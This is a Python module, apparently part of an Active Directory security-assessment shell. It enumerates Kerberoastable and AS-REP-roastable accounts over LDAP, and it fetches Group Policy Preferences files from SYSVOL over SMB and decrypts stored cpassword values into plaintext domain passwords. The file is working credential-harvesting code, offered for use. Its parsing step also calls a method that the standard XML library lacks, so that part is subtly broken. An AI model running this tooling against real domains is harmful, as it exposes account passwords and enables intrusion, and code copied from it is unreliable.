#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Security Assessment Mixin — 安全评估命令 (2 个)
AS-REP Roastable 用户发现 + GPP 密码解密。
"""

import base64
import re
import xml.etree.ElementTree as ET
from io import BytesIO

try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import unpad
except ImportError:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad

from utils.ui import print_info, print_success, print_found, print_warn, print_error
from utils.helpers import paged_search

# ═══════════════════════════════════════════════════════════════
#  GPP 密码解密常量
#
#  Microsoft 在 [MS-GPPREF] 规范中公开的 AES-256-CBC 密钥，
#  用于解密 Group Policy Preferences 中 cpassword 属性。
#  MS14-025 补丁后新建的 GPO 不再允许存储密码，但旧 GPO
#  中的 cpassword 仍然可以被解密。
# ═══════════════════════════════════════════════════════════════

_GPP_KEY = (
    b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8"
    b"\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
)
_GPP_IV = b"\x00" * 16

# GPP XML 文件相对路径 (相对于 GPO 根目录)
# Machine 和 User 偏好设置都可能包含密码
_GPP_FILES = [
    'Machine\\Preferences\\Groups\\Groups.xml',
    'Machine\\Preferences\\Services\\Services.xml',
    'Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml',
    'Machine\\Preferences\\Drives\\Drives.xml',
    'Machine\\Preferences\\DataSources\\DataSources.xml',
    'Machine\\Preferences\\Printers\\Printers.xml',
    'Machine\\Preferences\\Environment\\Environment.xml',
    'User\\Preferences\\Groups\\Groups.xml',
    'User\\Preferences\\Services\\Services.xml',
    'User\\Preferences\\ScheduledTasks\\ScheduledTasks.xml',
    'User\\Preferences\\Drives\\Drives.xml',
    'User\\Preferences\\DataSources\\DataSources.xml',
    'User\\Preferences\\Printers\\Printers.xml',
    'User\\Preferences\\Environment\\Environment.xml',
]


def _decrypt_gpp_cpassword(cpassword):
    """使用 Microsoft 公开的 AES-256-CBC 密钥解密 GPP cpassword"""
    if not cpassword:
        return None

    # 修正 Base64 padding
    pad = len(cpassword) % 4
    if pad == 1:
        cpassword = cpassword[:-1]
    elif pad in (2, 3):
        cpassword += "=" * (4 - pad)

    try:
        encrypted = base64.b64decode(cpassword)
        cipher = AES.new(_GPP_KEY, AES.MODE_CBC, _GPP_IV)
        decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
        return decrypted.decode('utf-16-le')
    except Exception:
        return None


def _parse_gpp_xml(xml_content, gpo_name):
    """解析 GPP XML，提取所有 cpassword 并解密"""
    results = []
    try:
        root = ET.fromstring(xml_content)
    except ET.ParseError:
        return results

    for elem in root.iter():
        cpassword = elem.get('cpassword')
        if cpassword:
            # 不同 XML 类型用不同属性存储用户名
            user = (
                elem.get('userName')
                or elem.get('newName')
                or elem.get('accountName')
                or elem.get('runAs')
                or 'Unknown'
            )
            changed = elem.getparent().get('changed', '') if elem.getparent() is not None else ''

            password = _decrypt_gpp_cpassword(cpassword)
            if password is not None:
                results.append({
                    'gpo': gpo_name,
                    'user': user,
                    'password': password,
                    'changed': changed,
                })

    return results


class AssessmentMixin:
    """Security Assessment 命令集"""

    # ── find_kerberoastable ─────────────────────────────────────
    def do_find_kerberoastable(self, line):
        """find_kerberoastable — Kerberoastable 用户 (有 SPN 的启用账户)"""
        print_info("Searching for Kerberoastable users...")
        entries = paged_search(
            self.client, self.domain_dumper.root,
            '(&(objectClass=user)(!(objectClass=computer))(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
            attributes=['sAMAccountName', 'servicePrincipalName', 'distinguishedName'],
        )
        if entries:
            print_warn("Found %d Kerberoastable user(s)!" % len(entries))
            for entry in entries:
                sam = entry['sAMAccountName'].value
                spns = entry['servicePrincipalName'].values
                print_found("%s (%s)" % (sam, entry.entry_dn))
                for spn in spns:
                    print_info("  SPN: %s" % spn)
        else:
            print_success("No Kerberoastable users found")

    # ── find_preauth_disabled ─────────────────────────────────
    def do_find_preauth_disabled(self, line):
        """find_preauth_disabled — 不需要 Kerberos 预认证的用户 (AS-REP Roastable)"""
        print_info("Searching for users with pre-auth disabled...")
        # DONT_REQ_PREAUTH = 0x400000
        entries = paged_search(
            self.client, self.domain_dumper.root,
            '(&(objectClass=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
            attributes=['sAMAccountName', 'distinguishedName'],
        )
        if entries:
            print_warn("Found %d AS-REP Roastable user(s)!" % len(entries))
            for entry in entries:
                print_found("%s (%s)" % (entry['sAMAccountName'].value, entry.entry_dn))
        else:
            print_success("No users with pre-auth disabled found")

    # ── find_gpp_passwords ────────────────────────────────────
    def do_find_gpp_passwords(self, line):
        """find_gpp_passwords — 搜索并解密 SYSVOL 中的 GPP 密码"""
        from impacket.smbconnection import SMBConnection

        print_info("Searching for GPP passwords in SYSVOL...")

        # 检查凭据
        if not self.password and not self.nthash:
            print_error("No credentials available for SMB connection")
            return

        domain = self._extract_domain(self.base_DN)

        # 建立 SMB 连接
        try:
            smb = SMBConnection(self.dc_address, self.dc_address)
            if self.nthash:
                smb.login(self.username, '', domain, self.lmhash, self.nthash)
            else:
                smb.login(self.username, self.password, domain)
        except Exception as e:
            print_error("SMB connection failed: %s" % str(e))
            return

        # 通过 LDAP 枚举所有 GPO，获取 SYSVOL 路径
        entries = paged_search(
            self.client, self.domain_dumper.root,
            '(objectClass=groupPolicyContainer)',
            attributes=['cn', 'displayName', 'gPCFileSysPath'],
        )

        print_info("Checking %d GPO(s) for GPP passwords..." % len(entries))

        found = []
        checked = 0

        for entry in entries:
            gpo_name = entry['displayName'].value or entry['cn'].value
            path = entry['gPCFileSysPath'].value or ''

            # 从 UNC 路径提取 SYSVOL 之后的相对路径
            # \\corp.local\SysVol\corp.local\Policies\{GUID}
            # → corp.local\Policies\{GUID}
            match = re.search(r'[Ss]ys[Vv]ol[\\/](.+)$', path)
            if not match:
                continue
            policy_path = match.group(1).replace('/', '\\')

            # 逐个检查 GPP XML 文件
            for gpp_file in _GPP_FILES:
                full_path = '%s\\%s' % (policy_path, gpp_file)

                try:
                    buf = BytesIO()
                    smb.getFile('SYSVOL', full_path, buf.write)
                    xml_content = buf.getvalue()
                except Exception:
                    continue

                checked += 1
                passwords = _parse_gpp_xml(xml_content, gpo_name)
                found.extend(passwords)

        try:
            smb.close()
        except Exception:
            pass

        # 输出结果
        if found:
            print_warn("Found %d GPP password(s) in %d file(s)!" % (len(found), checked))
            for item in found:
                print_found("GPO: %s" % item['gpo'])
                print_info("  User:     %s" % item['user'])
                print_info("  Password: %s" % item['password'])
                if item['changed']:
                    print_info("  Changed:  %s" % item['changed'])
        else:
            if checked:
                print_success("No GPP passwords found (checked %d preference file(s))" % checked)
            else:
                print_success("No GPP preference files found in SYSVOL")
